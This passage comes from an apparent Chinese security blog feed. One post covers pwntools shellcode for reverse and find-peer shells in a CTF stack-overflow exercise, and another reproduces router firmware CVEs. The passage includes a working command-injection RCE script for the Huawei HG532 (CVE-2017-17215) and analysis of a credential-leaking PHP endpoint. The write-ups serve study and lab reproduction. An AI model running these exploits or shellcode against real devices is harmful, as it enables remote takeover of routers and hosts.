.shellcode,&quot;awx&quot;</span><br><span class="line">.global _start</span><br><span class="line">.global __start</span><br><span class="line">.p2align 2</span><br><span class="line">_start:</span><br><span class="line">__start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    /* dup() file descriptor 4 into stdin/stdout/stderr */</span><br><span class="line">dup_1:</span><br><span class="line">    push 4</span><br><span class="line">    pop rbp</span><br><span class="line">    push 3</span><br><span class="line">loop_2:</span><br><span class="line">    pop rsi</span><br><span class="line">    dec rsi</span><br><span class="line">    js after_3</span><br><span class="line">    push rsi</span><br><span class="line">    /* call dup2(&#x27;rbp&#x27;, &#x27;rsi&#x27;) */</span><br><span class="line">    push 33 /* 0x21 */</span><br><span class="line">    pop rax</span><br><span class="line">    mov rdi, rbp</span><br><span class="line">    syscall</span><br><span class="line">    jmp loop_2</span><br><span class="line">after_3:</span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    mov rax, 0x732f2f2f6e69622f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push b&#x27;sh\x00&#x27; */</span><br><span class="line">    push 0x1010101 ^ 0x6873</span><br><span class="line">    xor dword ptr [rsp], 0x1010101</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push 8</span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push 59 /* 0x3b */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><h2 id="connect-dupsh-反连"><a href="#connect-dupsh-反连" class="headerlink" title="connect()+dupsh() - 反连"></a>connect()+dupsh() - 反连</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">30</span></span><br><span class="line">payload += p64(<span class="number">0x40120c</span>)</span><br><span class="line">payload += asm(shellcraft.connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">4444</span>,<span class="string">&#x27;ipv4&#x27;</span>)+shellcraft.dupsh()) </span><br><span class="line"></span><br><span class="line">pr.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pr.interactive()</span></span><br></pre></td></tr></table></figure><p>本方法是利用server主动去connect我们监听的端口，建立socket连接，并用这个socket去覆盖原本的 0 1 2，达到将输出定向到远端的目的。</p><h2 id="findpeersh"><a href="#findpeersh" class="headerlink" title="findpeersh()"></a>findpeersh()</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">30</span></span><br><span class="line">payload += p64(<span class="number">0x40120c</span>)</span><br><span class="line">payload += asm(shellcraft.findpeersh(pr.lport))</span><br><span class="line"></span><br><span class="line">pr.sendline(payload)</span><br><span class="line"></span><br><span class="line">pr.interactive()</span><br></pre></td></tr></table></figure><p>本方法是在server1进程中寻找与<code>pr.lport</code>端口有连接的socket，并覆盖原来fd的0 1 2。攻击进程中成功拿到shell时的连接情况如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">.section .shellcode,&quot;awx&quot;</span><br><span class="line">.global _start</span><br><span class="line">.global __start</span><br><span class="line">.p2align 2</span><br><span class="line">_start:</span><br><span class="line">__start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">findpeer_4:</span><br><span class="line">    /* File descriptor in rdi */</span><br><span class="line">    push -1</span><br><span class="line">    pop rdi</span><br><span class="line">    /* struct sockaddr * in rsi */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    /* Size of address structure */</span><br><span class="line">    /* push 0x20 */</span><br><span class="line">    push 0x20</span><br><span class="line">loop_5:</span><br><span class="line">    /* Next file descriptor */</span><br><span class="line">    inc rdi</span><br><span class="line">    /* See if it is a valid socket */</span><br><span class="line">    /* call getpeername(&#x27;rdi&#x27;, &#x27;rsi&#x27;, &#x27;rsp&#x27;) */</span><br><span class="line">    push 52 /* 0x34 */</span><br><span class="line">    pop rax</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    syscall</span><br><span class="line">    /* Was it successful? */</span><br><span class="line">    test eax, eax</span><br><span class="line">    /* No? Try the next */</span><br><span class="line">    jnz loop_5</span><br><span class="line">    /* Check if port is right */</span><br><span class="line">    lea rax, [rsp + 10]</span><br><span class="line">    mov ax, [rax]</span><br><span class="line">    cmp ax, 59083</span><br><span class="line">    jne loop_5</span><br><span class="line">    /* Socket found, it is in RDI */</span><br><span class="line">    /* dup() file descriptor rdi into stdin/stdout/stderr */</span><br><span class="line">dup_6:</span><br><span class="line">    mov rbp, rdi</span><br><span class="line">    push 3</span><br><span class="line">loop_7:</span><br><span class="line">    pop rsi</span><br><span class="line">    dec rsi</span><br><span class="line">    js after_8</span><br><span class="line">    push rsi</span><br><span class="line">    /* call dup2(&#x27;rbp&#x27;, &#x27;rsi&#x27;) */</span><br><span class="line">    push 33 /* 0x21 */</span><br><span class="line">    pop rax</span><br><span class="line">    mov rdi, rbp</span><br><span class="line">    syscall</span><br><span class="line">    jmp loop_7</span><br><span class="line">after_8:</span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    mov rax, 0x732f2f2f6e69622f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push b&#x27;sh\x00&#x27; */</span><br><span class="line">    push 0x1010101 ^ 0x6873</span><br><span class="line">    xor dword ptr [rsp], 0x1010101</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push 8</span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push 59 /* 0x3b */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>这个还不太理解</p><p><code>getpeername</code> 是一个系统调用，用于获取与某个套接字（socket）关联的对端（peer）的地址信息。</p>]]></content>
    
    
    <summary type="html">因吹斯听</summary>
    
    
    
    <category term="PWN" scheme="https://ixout.github.io/categories/PWN/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="shell" scheme="https://ixout.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>固件安全初识</title>
    <link href="https://ixout.github.io/posts/3834/"/>
    <id>https://ixout.github.io/posts/3834/</id>
    <published>2024-02-29T12:56:59.000Z</published>
    <updated>2024-05-01T14:35:23.326Z</updated>
    
    <content type="html"><![CDATA[<p>几次比赛遇到了不少固件分析的题目,但苦于之前一直没有接触过,</p><p>这部分应该算是iot,这么久了,连一点基础的概念都没有,真正碰上了这类题目,完全不知道该从何处下手</p><p>先从复现一些简单的漏洞开始学起,尽量有个基础的认识</p><p>ctf中涉及到的固件大多是用于网络服务的,那就必然会涉及到许多网络方面的知识,像网络连接建立,网络协议之类的</p><p>这方面也是我的短板,只能一起学起了</p><p>另外关于这些固件上哪找,其实挺好办</p><p>大部分厂商都会在自家官网提供<code>firmware</code>的下载连接</p><p>直接google搜索即可,例如</p><p>google&gt;HUAWEI support</p><p>或者</p><p>google&gt;HUAWEI firmware download</p><p>一些常见的厂商可以直接保存</p><h1 id="CVE-2017-17215"><a href="#CVE-2017-17215" class="headerlink" title="CVE-2017-17215"></a>CVE-2017-17215</h1><p><a href="https://research.checkpoint.com/2017/good-zero-day-skiddie/">Check Point团队报告</a>华为 HG532 产品的远程命令执行漏洞(CVE-2017-17215),华为HG532 是一款小型家用和办公用户打造的高速无线路由器。利用原理是利用upnp服务中的注入漏洞实现<u>任意命令执行</u>。</p><h2 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h2><p>使用的固件是HG532eV100R001C01B020_upgrade_packet.bin</p><p>获得固件的运行环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta</span><br></pre></td></tr></table></figure><p>按照别的大佬所说需要的是这两个版本,至于怎么找到的不知道</p><p>创建虚拟网桥，实现虚拟机内部和Ubuntu的连接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils</span><br><span class="line">sudo brctl addbr Virbr0</span><br><span class="line">sudo ifconfig Virbr0 192.168.153.1/24 up</span><br></pre></td></tr></table></figure><p>创建tap接口，名字为tap0，并添加到网桥</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.153.11/24 up</span><br><span class="line">sudo brctl addif Virbr0 tap0</span><br></pre></td></tr></table></figure><p>qemu启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -netdev tap,<span class="built_in">id</span>=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure><p>在启动的虚拟机里面给网卡添加一个IP，使得qemu的虚拟机与外部宿主机互通。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.153.2/24 up</span><br></pre></td></tr></table></figure><p>将之前解压出来的squashfs-root文件夹通过scp命令，复制到虚拟机中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.153.2:~/</span><br></pre></td></tr></table></figure><p>在虚拟机中挂载dev和proc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br></pre></td></tr></table></figure><p>启动shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> squashfs-root sh</span><br></pre></td></tr></table></figure><p>这个终端备用，后面启动服务后，需要重置eth0和br0</p><p>通过ssh启动的终端，启动路由器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.153.2</span><br><span class="line"><span class="built_in">chroot</span> squashfs-root /bin/sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>虚拟机里面的路由器IP发生了变化，ssh连接已经断开，返回之前的虚拟机中的终端。<br>重新更改路由器的IP，以便于外部的Ubuntu登录管理界面</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.153.2/24 up</span><br><span class="line">ifconfig br0 192.168.153.11/24 up</span><br></pre></td></tr></table></figure><p>最终浏览器打开</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-03-04_165034.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>Huawei Home Gateway applies the Universal Plug and Play (UPnP) protocol. Via the TR-064 technical report standard, the protocol is widely used in embedded devices to connect seamlessly and simplify the implementation of networks in home and corporate environments.</p><p>TR-064 was designed and intended for local network configuration. For example, it allows an engineer to implement basic device configuration, firmware upgrades and more from within the internal network.</p><p>In this case though, the TR-064 implementation in the Huawei devices was exposed to WAN through port 37215 (UPnP).</p><p>From looking into the UPnP description of the device, it can be seen that it supports a service type named <code>DeviceUpgrade</code>. This service is supposedly carrying out a firmware upgrade action by sending a request to “/ctrlt/DeviceUpgrade_1” (referred to as controlURL ) and is carried out with two elements named <code>NewStatusURL</code> and <code>NewDownloadURL</code>.</p><p>The vulnerability allows remote administrators to execute arbitrary commands by injecting shell meta-characters “$()” in the NewStatusURL and NewDownloadURL as can be seen below.</p></blockquote><p>根据这段内容我们可以知道,漏洞是出现在/bin/upnp服务中,当向37215端口访问<code>/ctrlt/DeviceUpgrade_1</code>路径时,<code>NewStatusURL</code> and <code>NewDownloadURL</code>这两个标签会产生远程命令执行漏洞</p><p>ida分析一下upnp程序</p><p>搜索字符串<code>NewStatusURL</code>找到对应位置并创建函数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-03-04_185722.png" alt=""></p><p>这里会利用用户传递的字符串构造一个命令并让<code>system</code>调用</p><p>基于shell的特性,如果使用<code>;</code>或者<code>$()</code>便能够做到任意命令执行</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Authorization = <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Authorization&quot;</span>: Authorization&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;</span>)</span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;command &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;s:Body&gt;</span></span><br><span class="line"><span class="string">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;NewStatusURL&gt;winmt&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">            &lt;NewDownloadURL&gt;;<span class="subst">&#123;cmd&#125;</span>;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">        &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string">    &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.192.133:37215/ctrlt/DeviceUpgrade_1&#x27;</span>, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nstatus_code: &quot;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure><h1 id="CVE-2018-5767"><a href="#CVE-2018-5767" class="headerlink" title="CVE-2018-5767"></a>CVE-2018-5767</h1><p>Tenda-Ac15可以说是一个各种漏洞cve满天飞的固件了,涉及到的漏洞也比较基础</p><p>适合用来初步了解学习</p><h1 id="CVE-2020-10987"><a href="#CVE-2020-10987" class="headerlink" title="CVE-2020-10987"></a>CVE-2020-10987</h1><h1 id="CVE-2018-7034"><a href="#CVE-2018-7034" class="headerlink" title="CVE-2018-7034"></a>CVE-2018-7034</h1><p>在<code>/htdocs/web</code>目录下有一个<code>getcfg.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span><span class="keyword">echo</span> <span class="string">&quot;&lt;?&quot;</span>;<span class="meta">?&gt;</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">&lt;?</span><span class="keyword">echo</span> <span class="string">&quot;?&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;postxml&gt;</span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">include</span> <span class="string">&quot;/htdocs/phplib/trace.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;CACHE&quot;</span>] == <span class="string">&quot;true&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dump</span>(<span class="number">1</span>, <span class="string">&quot;/runtime/session/&quot;</span>.<span class="variable">$SESSION_UID</span>.<span class="string">&quot;/postxml&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$AUTHORIZED_GROUP</span> &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* not a power user, return error message */</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t&lt;result&gt;FAILED&lt;/result&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t&lt;message&gt;Not authorized&lt;/message&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* cut_count() will return 0 when no or only one token. */</span></span><br><span class="line"><span class="variable">$SERVICE_COUNT</span> = <span class="title function_ invoke__">cut_count</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: got &quot;</span>.<span class="variable">$SERVICE_COUNT</span>.<span class="string">&quot; service(s): &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>]);</span><br><span class="line"><span class="variable">$SERVICE_INDEX</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$SERVICE_INDEX</span> &lt; <span class="variable">$SERVICE_COUNT</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$GETCFG_SVC</span> = <span class="title function_ invoke__">cut</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="variable">$SERVICE_INDEX</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: serivce[&quot;</span>.<span class="variable">$SERVICE_INDEX</span>.<span class="string">&quot;] = &quot;</span>.<span class="variable">$GETCFG_SVC</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$GETCFG_SVC</span>!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;/htdocs/webinc/getcfg/&quot;</span>.<span class="variable">$GETCFG_SVC</span>.<span class="string">&quot;.xml.php&quot;</span>;</span><br><span class="line"><span class="comment">/* GETCFG_SVC will be passed to the child process. */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">isfile</span>(<span class="variable">$file</span>)==<span class="string">&quot;1&quot;</span>) <span class="title function_ invoke__">dophp</span>(<span class="string">&quot;load&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$SERVICE_INDEX</span>++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;/postxml&gt;</span><br></pre></td></tr></table></figure><p>可以看到第<code>34</code>行会加载进来一个文件，而该文件的路径在第<code>32</code>行，其中<code>$GETCFG_SVC</code>是通过<code>POST</code>请求传进来的<code>$_POST[&quot;SERVICES&quot;]</code>，因此，这个任意文件的加载是我们可控的。但是，前提是要满足<code>$AUTHORIZED_GROUP &gt;= 0</code>。</p><p>那么我们加载什么文件呢？这个文件的路径得在<code>/htdocs/webinc/getcfg</code>目录下，且后缀得是<code>.xml.php</code>，我们关注到了<code>/htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php</code>这个文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="string">&quot;/device/account/entry&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$InDeX</span> &gt; <span class="variable">$cnt</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;entry&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;uid&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;uid&quot;</span>).<span class="string">&quot;&lt;/uid&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;name&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;name&quot;</span>).<span class="string">&quot;&lt;/name&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;usrid&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;usrid&quot;</span>).<span class="string">&quot;&lt;/usrid&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;password&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;password&quot;</span>).<span class="string">&quot;&lt;/password&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;group&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;group&quot;</span>).<span class="string">&quot;&lt;/group&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;description&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;description&quot;</span>).<span class="string">&quot;&lt;/description&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;/entry&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其会打印出很多重要信息</p><p>但是，我们首先还是得先知道如何绕过全局变量<code>$AUTHORIZED_GROUP &gt;= 0</code>的检查，我们传入的数据都是先通过登录验证文件<code>htdocs/cgibin</code>进行脚本语言解析后，再将解析好的<code>URL</code>结构发送给这里的<code>php</code>文件。</p><p>因此，我们需要逆向分析<code>cgibin</code>文件，由于这里的<code>webserver</code>运行的是<code>php</code>脚本，那么这个二进制文件中重点的就是处理<code>php</code>语言的部分，也就是<code>phpcgi</code></p><h2 id="二进制逆向"><a href="#二进制逆向" class="headerlink" title="二进制逆向"></a>二进制逆向</h2><p>针对cgibin进行分析,cgibin做的主要工作便是处理传入的参数并作拼接</p><p>我们利用的就是拼接时并没有做有效的检查</p><p><code>AUTHORIZED_GROUP</code>变量也可以由post请求传递</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 